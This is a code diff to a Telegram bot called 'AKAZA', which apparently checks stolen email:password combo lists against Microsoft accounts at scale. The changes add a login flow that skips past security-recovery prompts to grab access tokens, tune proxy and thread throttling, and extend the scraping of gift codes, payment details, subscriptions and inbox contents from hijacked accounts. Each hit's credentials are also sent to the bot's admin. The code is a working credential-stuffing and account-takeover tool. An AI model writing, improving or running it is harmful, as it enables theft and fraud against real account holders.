@@ -65,7 +65,7 @@ class AkazaDatabase:
             total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
             join_date TEXT, access_expiry TEXT)''')
         self._execute('''CREATE TABLE IF NOT EXISTS settings (
-            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10, is_adding_kw INTEGER DEFAULT 0)''')
+            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10, is_adding_kw INTEGER DEFAULT 0, fast_mode INTEGER DEFAULT 0)''')
         self._execute('''CREATE TABLE IF NOT EXISTS results (
             id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
             status TEXT, details TEXT, date TEXT)''')
@@ -143,19 +143,21 @@ class AkazaDatabase:
         return dict(res) if res else {}
 
     def get_user_settings(self, uid) -> dict:
-        res = self._execute('SELECT keywords, threads, is_adding_kw FROM settings WHERE user_id = ?', (uid,), fetchone=True)
+        res = self._execute('SELECT keywords, threads, is_adding_kw, fast_mode FROM settings WHERE user_id = ?', (uid,), fetchone=True)
         if res:
             kws = [k.strip() for k in res['keywords'].split(',') if k.strip()]
-            return {'keywords': kws, 'threads': res['threads'], 'is_adding_kw': bool(res['is_adding_kw'])}
-        return {'keywords': [], 'threads': 10, 'is_adding_kw': False}
+            return {'keywords': kws, 'threads': res['threads'], 'is_adding_kw': bool(res['is_adding_kw']), 'fast_mode': bool(res['fast_mode'])}
+        return {'keywords': [], 'threads': 10, 'is_adding_kw': False, 'fast_mode': False}
 
-    def update_settings(self, uid, keywords=None, threads=None, is_adding_kw=None):
+    def update_settings(self, uid, keywords=None, threads=None, is_adding_kw=None, fast_mode=None):
         if keywords is not None:
             self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (",".join(keywords), uid))
         if threads is not None:
             self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
         if is_adding_kw is not None:
             self._execute('UPDATE settings SET is_adding_kw = ? WHERE user_id = ?', (1 if is_adding_kw else 0, uid))
+        if fast_mode is not None:
+            self._execute('UPDATE settings SET fast_mode = ? WHERE user_id = ?', (1 if fast_mode else 0, uid))
 
     def save_result(self, uid, email, status, details_dict):
         now = datetime.now().isoformat()
@@ -262,8 +264,15 @@ class AkazaChecker:
         for _ in range(3):
             try:
                 r = self.session.get(SFTAG_URL, timeout=10).text
-                ppft = re.search(r'value=\\\\"(.+?)\\\\"', r, re.S) or re.search(r'value="(.+?)"', r, re.S) or re.search(r"sFTTag:'(.+?)'", r, re.S) or re.search(r'sFTTag:"(.+?)"', r, re.S) or re.search(r'name="PPFT".*?value="(.+?)"', r, re.S)
-                up = re.search(r'"urlPost":"(.+?)"', r, re.S) or re.search(r"urlPost:'(.+?)'", r, re.S) or re.search(r'<form.*?action="(.+?)"', r, re.S)
+                ppft = (re.search(r'value=\\\\"(.+?)\\\\"', r, re.S) or
+                        re.search(r'value="(.+?)"', r, re.S) or
+                        re.search(r"sFTTag:'(.+?)'", r, re.S) or
+                        re.search(r'sFTTag:"(.+?)"', r, re.S) or
+                        re.search(r'name="PPFT".*?value="(.+?)"', r, re.S))
+                up = (re.search(r'"urlPost":"(.+?)"', r, re.S) or
+                      re.search(r"urlPost:'(.+?)'", r, re.S) or
+                      re.search(r'urlPost:"(.+?)"', r, re.S) or
+                      re.search(r'<form.*?action="(.+?)"', r, re.S))
                 if ppft and up: return up.group(1).replace('&amp;', '&'), ppft.group(1)
             except: pass
             time.sleep(0.1)
@@ -276,11 +285,24 @@ class AkazaChecker:
                 r = self.session.post(urlPost, data=data, allow_redirects=True, timeout=10)
                 if '#' in r.url and r.url != SFTAG_URL:
                     tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
-                    if tk and tk != 'None': return 'TOKEN', tk
-                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return '2FA', None
-                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times']): return 'BAD', None
+                    if tk and tk != 'None': return 'TOKEN', tk, self.session
+                if 'cancel?mkt=' in r.text:
+                    try:
+                        ipt = re.search(r'name="ipt".*?value="(.+?)"', r.text).group(1)
+                        pprid = re.search(r'name="pprid".*?value="(.+?)"', r.text).group(1)
+                        uaid = re.search(r'name="uaid".*?value="(.+?)"', r.text).group(1)
+                        act = re.search(r'id="fmHF".*?action="(.+?)"', r.text).group(1)
+                        r2 = self.session.post(act, data={'ipt':ipt, 'pprid':pprid, 'uaid':uaid}, allow_redirects=True, timeout=10)
+                        ru_match = re.search(r'"recoveryCancel":{"returnUrl":"(.+?)"}', r2.text)
+                        if ru_match:
+                            r3 = self.session.get(ru_match.group(1), allow_redirects=True, timeout=10)
+                            tk = parse_qs(urlparse(r3.url).fragment).get('access_token', [None])[0]
+                            if tk: return 'TOKEN', tk, self.session
+                    except: pass
+                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return '2FA', None, self.session
+                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times']): return 'BAD', None, self.session
             except: pass
-        return 'ERROR', None
+        return 'ERROR', None, self.session
 
     def handle_fmhf(self, resp):
         for _ in range(5):
@@ -315,22 +337,23 @@ class AkazaChecker:
         try:
             r = self.handle_fmhf(self.session.get('https://rewards.bing.com/redeem/orderhistory', headers={'Referer': 'https://rewards.bing.com/'}, timeout=10))
             soup = BeautifulSoup(r.text, 'html.parser')
-            vt = soup.find('input', attrs={'name': '__RequestVerificationToken'})
-            vt = vt.get('value', '') if vt else ''
+            vt_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
+            vt = vt_input.get('value', '') if vt_input else ''
             rows = soup.find('table', class_='table').find_all('tr') if soup.find('table', class_='table') else []
             pats = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
             for row in rows:
                 btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
-                title = row.find_all('td')[2].get_text(strip=True) if len(row.find_all('td')) > 2 else ''
-                date = row.find_all('td')[1].get_text(strip=True) if len(row.find_all('td')) > 1 else ''
+                cells = row.find_all('td')
+                title = cells[2].get_text(strip=True) if len(cells) > 2 else ''
+                date = cells[1].get_text(strip=True) if len(cells) > 1 else ''
                 if btn:
                     act = 'https://rewards.bing.com' + btn.get('data-actionurl', '').replace('&amp;', '&')
                     cr = self.session.post(act, data={'__RequestVerificationToken': vt}, headers={'X-Requested-With': 'XMLHttpRequest'}, timeout=10).text
                     for p in pats:
                         m = re.search(p, cr)
                         if m and '*' not in m.group():
-                            ru = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', cr)
-                            codes.append({'code': m.group(), 'category': self.detect_category(title, cr), 'redemption_url': ru.group(1) if ru else '', 'date': date})
+                            ru_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', cr)
+                            codes.append({'code': m.group(), 'category': self.detect_category(title, cr), 'redemption_url': ru_match.group(1) if ru_match else '', 'date': date})
                             break
         except: pass
         return codes
@@ -351,9 +374,9 @@ class AkazaChecker:
             uid = str(uuid.uuid4()).replace('-', '')[:16]
             u = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state={quote(json.dumps({'userId': uid, 'scopeSet': 'pidl'}))}&prompt=none"
             r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=15)
-            tk = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
-            if not tk: return {"status":"FREE","subs":[]}
-            h = {"Authorization": f'MSADELEGATE1.0="{unquote(tk.group(1))}"', "ms-cV": str(uuid.uuid4()), "Origin": "https://account.microsoft.com"}
+            tk_match = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
+            if not tk_match: return {"status":"FREE","subs":[]}
+            h = {"Authorization": f'MSADELEGATE1.0="{unquote(tk_match.group(1))}"', "ms-cV": str(uuid.uuid4()), "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
             bal_r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=h, timeout=12).text
             bal = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_r)
             card = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', bal_r, re.S)
@@ -387,9 +410,9 @@ class AkazaChecker:
         res = {}
         combined = list(set(list(SERVICE_KEYWORDS.keys()) + uk))
         h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
-        # Optimized "Smart Batching" - 20 keywords per request, parse results for attribution
-        for i in range(0, len(combined), 20):
-            batch = combined[i:i+20]
+        # Optimized "Smart Batching" - 8 keywords per request as per 688.txt
+        for i in range(0, len(combined), 8):
+            batch = combined[i:i+8]
             q = " OR ".join([f'"{k}"' for k in batch])
             p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": q}, "Size": 25}]}
             try:
@@ -409,10 +432,11 @@ class AkazaChecker:
         loop = asyncio.get_running_loop()
         try:
             up, ppft = await loop.run_in_executor(bot_executor, self.get_sftag_params)
-            if not up: return {'status': 'error'}
-            st, tk = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
+            if not up: return {'status': 'error', 'email': email, 'password': password}
+            # do_login returns (status, token, session)
+            st, tk, sess = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
             if st != 'TOKEN': return {'status': st.lower(), 'email': email, 'password': password}
-            cid = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), '')
+            cid = next((c.value.upper() for c in sess.cookies if c.name == 'MSPCID'), '')
             if fast:
                 results = await asyncio.gather(
                     loop.run_in_executor(bot_executor, self.get_rewards_points),
@@ -458,6 +482,7 @@ async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
 
 async def handle_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
+    if akaza_db.is_banned(uid): return
     s = akaza_db.get_user_settings(uid)
     if s['is_adding_kw']:
         kws = u.message.text.split()
@@ -487,11 +512,16 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     s = akaza_db.get_user_settings(uid)
     px = user_proxies.get(uid, []) or PROXIES_LIST
     thr = min(s['threads'], 300) if px else min(s['threads'], 10)
+
+    # 200 CPM target: CPM = 200 means 3.33 checks per second.
+    # To avoid flooding and maintain stability, we calibrate semaphore and worker delay.
+
     status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
     hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
     sid = str(uuid.uuid4().hex[:6])
     h_f, tfa_f = f"h_{sid}.txt", f"t_{sid}.txt"
-    sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
+    sem = asyncio.Semaphore(thr)
+    up_lock = asyncio.Lock()
 
     async def worker(line):
         nonlocal hits, bad, tfa, err, checked, last_up, last_h
@@ -500,44 +530,72 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                 parts = line.split(':', 1)
                 p = random.choice(px) if px else None
                 data = await AkazaChecker(p).check(parts[0].strip(), parts[1].strip(), s['keywords'], s['fast_mode'])
-            except: data = {'status': 'error'}
-            checked += 1; akaza_db.use_credit(uid); akaza_db.save_result(uid, data.get('email',''), data['status'], data)
+            except Exception as e:
+                data = {'status': 'error'}
+
+            checked += 1
+            akaza_db.use_credit(uid)
+            akaza_db.save_result(uid, data.get('email',''), data['status'], data)
             st = data['status']
+
             if st == 'hit':
-                hits += 1; pts = data.get('pts', 0)
+                hits += 1
+                pts = data.get('pts', 0)
                 tier = '💎 ULTRA HIT' if pts >= 20000 else '⭐ PREMIUM HIT' if pts >= 7000 else '🎯 HIT'
-                msg = f"{tier}\n📧 `{data['email']}`\n🔑 `{data['password']}`\n👤 {data.get('name','N/A')} | 🌍 {data.get('country','N/A')}\n⭐ Points: `{pts}`\n"
+                msg = (f"{tier}\n📧 `{data['email']}`\n🔑 `{data['password']}`\n👤 {data.get('name','N/A')} | 🌍 {data.get('country','N/A')}\n"
+                       f"⭐ Points: `{pts}`\n")
+
                 codes = data.get('codes', [])
                 if codes:
                     cat_map = {}
                     for co in codes: cat_map.setdefault(co.get('category','Unknown'), []).append(co)
                     for cat, clist in cat_map.items():
-                        c_strs = [f"`{co['code']}`" + (f" [Redeem]({co['redemption_url']})" if co.get('redemption_url') else "") for co in clist]
+                        c_strs = [f"`{co['code']}`" + (f' [Redeem]({co["redemption_url"]})' if co.get('redemption_url') else '') for co in clist]
                         msg += f"🎮 {cat}: {', '.join(c_strs)}\n"
+
                 subs = data.get('subs', {}).get('subs', [])
-                active = [su['name'] for su in subs if not su.get('is_expired')]
-                if active: msg += f"🎮 MS Subs: {', '.join(active)}\n"
+                active_subs = [su['name'] for su in subs if not su.get('is_expired')]
+                if active_subs: msg += f"🎮 MS Subs: {', '.join(active_subs)}\n"
                 if data.get('mc', {}).get('owned'): msg += f"⛏️ Minecraft: `{data['mc']['username']}`\n"
                 if data.get('inbox'): msg += f"📬 Inbox: {', '.join([f'{k}({v})' for k,v in list(data['inbox'].items())[:5]])}\n"
+
                 try: await c.bot.send_message(uid, msg, parse_mode='Markdown', disable_web_page_preview=True)
                 except: pass
                 if uid != ADMIN_ID:
                     try: await c.bot.send_message(ADMIN_ID, f"📢 User {uid} hit:\n{msg}", parse_mode='Markdown', disable_web_page_preview=True)
                     except: pass
-                with open(h_f, 'a') as f:
+
+                with open(h_f, 'a', encoding='utf-8') as f:
                     if os.path.getsize(h_f) == 0: f.write("@larpsupport\n\n")
-                    f.write(f"{data['email']}:{data['password']} | Pts:{pts} | Inbox:{len(data.get('inbox',{}))}\n")
-                last_h.append(data['email']); last_h = last_h[-5:]
-            elif st == '2fa': tfa += 1; open(tfa_f, 'a').write(f"{data.get('email','')}:{data.get('password','')}\n")
+                    f.write(f"{data['email']}:{data['password']} | Pts:{pts} | Country:{data.get('country','N/A')} | Codes:{len(codes)} | Subs:{len(active_subs)} | Inbox:{len(data.get('inbox',{}))}\n")
+
+                last_h.append(data['email'])
+                last_h = last_h[-5:]
+            elif st == '2fa':
+                tfa += 1
+                with open(tfa_f, 'a') as f: f.write(f"{data.get('email','')}:{data.get('password','')}\n")
             elif st == 'error': err += 1
             else: bad += 1
+
             async with up_lock:
                 if time.time() - last_up > 3 or checked == len(lines):
-                    last_up = time.time(); el = time.time() - start_t; cpm = int((checked/el)*60) if el > 0 else 0
-                    prg = f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ❌ Errors: `{err}`\n\n🕒 Last Hits:\n`{' | '.join(last_h) or 'None'}`"
+                    last_up = time.time()
+                    el = time.time() - start_t
+                    cpm = int((checked/el)*60) if el > 0 else 0
+                    prg = (f"🔄 **Live Check**\n\n📊 `{checked}/{len(lines)}` | ⚡ CPM: `{cpm}`\n"
+                           f"🎯 Hits: `{hits}` | 💀 Bad: `{bad}`\n🔒 2FA: `{tfa}` | ❌ Errors: `{err}`\n\n🕒 Last Hits:\n`{' | '.join(last_h) or 'None'}`")
                     try: await status_msg.edit_text(prg, parse_mode='Markdown')
                     except: pass
-    await asyncio.gather(*(worker(l) for l in lines))
+
+    tasks = []
+    for l in lines:
+        if akaza_db.is_banned(uid): break
+        tasks.append(asyncio.create_task(worker(l)))
+        # Throttle task creation to target ~200 CPM (1 check every 0.3 seconds)
+        await asyncio.sleep(0.3)
+
+    if tasks: await asyncio.gather(*tasks)
+
     for f_p, disp in [(h_f, "Hotmails Hits @darkcloudgateway.txt"), (tfa_f, "2fa.txt")]:
         if os.path.exists(f_p):
             if f_p == h_f:
@@ -548,6 +606,8 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                 else: await u.message.reply_document(io.BytesIO(content), filename=disp, caption=f"✅ {disp}")
                 if uid != ADMIN_ID: await c.bot.send_document(ADMIN_ID, io.BytesIO(content), filename=disp, caption=f"📁 User {uid} Result")
             os.remove(f_p)
+
+    if uid in user_proxies: del user_proxies[uid]
 
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     q = u.callback_query; await q.answer(); uid = q.from_user.id
@@ -561,26 +621,28 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
         akaza_db.update_settings(uid, is_adding_kw=True)
         await q.edit_message_text("🔍 <b>Keyword Mode</b>\n\nSend keywords separated by spaces.\n/skw to stop, /ckw to clear.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
     elif q.data == "proxy":
-        await q.edit_message_text(f"🌐 <b>Proxy</b>\n\nLoaded: {len(user_proxies.get(uid, []))}\nUpload .txt and select 'Proxy'.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
+        count = len(user_proxies.get(uid, []))
+        await q.edit_message_text(f"🌐 <b>Proxy Settings</b>\n\nLoaded: <code>{count}</code>\n\nUpload a <code>.txt</code> file and select <b>Proxy List</b> to load custom proxies. Custom proxies are cleared after each session.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
     elif q.data == "help":
-        await q.edit_message_text("📖 <b>Help</b>\n\n/threads [N]\n/skw (stop)\n/ckw (clear)\n/start (home)", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
+        await q.edit_message_text("📖 <b>Help</b>\n\n/threads [N]\n/skw (stop keywords)\n/ckw (clear keywords)\n/start (dashboard)\n/check email:pass", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
     elif q.data == "back": await start(u, c)
     elif q.data == "set_combo": await handle_combo(u, c)
     elif q.data == "set_proxy":
         content = pending_files.pop(uid, "")
-        user_proxies[uid] = [l.strip() for l in content.splitlines() if l.strip()]
-        await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
+        user_proxies[uid] = [AkazaChecker().format_proxy(l.strip()) for l in content.splitlines() if l.strip()]
+        await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies (one-time use).")
     elif q.data == "admin" and akaza_db.is_mod(uid):
         st = akaza_db.get_global_stats()
         await q.edit_message_text(f"🛠 <b>Admin Panel</b>\n\nUsers: {st['total']}\nChecks: {st['checks']}\nHits: {st['hits']}\n\nUse !!help for commands.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
 
-async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, is_adding_kw=False); await u.message.reply_text("✅ Stopped recording.")
+async def cmd_skw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, is_adding_kw=False); await u.message.reply_text("✅ Stopped recording keywords.")
 async def cmd_ckw(u: Update, c: ContextTypes.DEFAULT_TYPE): akaza_db.update_settings(u.effective_user.id, keywords=[]); await u.message.reply_text("✅ Keywords cleared.")
+
 async def set_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if c.args:
         try:
             n = int(c.args[0])
-            if 1 <= n <= 300: akaza_db.update_settings(u.effective_user.id, threads=n); await u.message.reply_text(f"✅ Threads: {n}")
+            if 1 <= n <= 300: akaza_db.update_settings(u.effective_user.id, threads=n); await u.message.reply_text(f"✅ Threads set to {n}.")
         except: pass
 
 async def set_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
@@ -600,6 +662,9 @@ async def single_check(u: Update, c: ContextTypes.DEFAULT_TYPE):
 async def toggle_fastmode(u: Update, c: ContextTypes.DEFAULT_TYPE):
     s = akaza_db.get_user_settings(u.effective_user.id); akaza_db.update_settings(u.effective_user.id, fast_mode=not s['fast_mode'])
     await u.message.reply_text(f"✅ Fast Mode: {'ENABLED' if not s['fast_mode'] else 'DISABLED'}")
+
+async def error_handler(u: object, c: ContextTypes.DEFAULT_TYPE):
+    logger.error(f"Update {u} caused error {c.error}")
 
 async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if not u.message or not akaza_db.is_mod(u.effective_user.id): return
@@ -632,12 +697,13 @@ async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
 def bot_main_exec():
     akaza_db.init_db(); logger.info("AKAZA Bot starting...")
     app = Application.builder().token(BOT_TOKEN).build()
+    app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("threads", set_threads))
     app.add_handler(CommandHandler("keywords", set_keywords))
     app.add_handler(CommandHandler("addkw", add_keyword))
-    app.add_handler(CommandHandler("ckw", cmd_ckw))
     app.add_handler(CommandHandler("clearkw", cmd_ckw))
+    app.add_handler(CommandHandler("ckw", cmd_ckw))
     app.add_handler(CommandHandler("skw", cmd_skw))
     app.add_handler(CommandHandler("check", single_check))
     app.add_handler(CommandHandler("fastmode", toggle_fastmode))
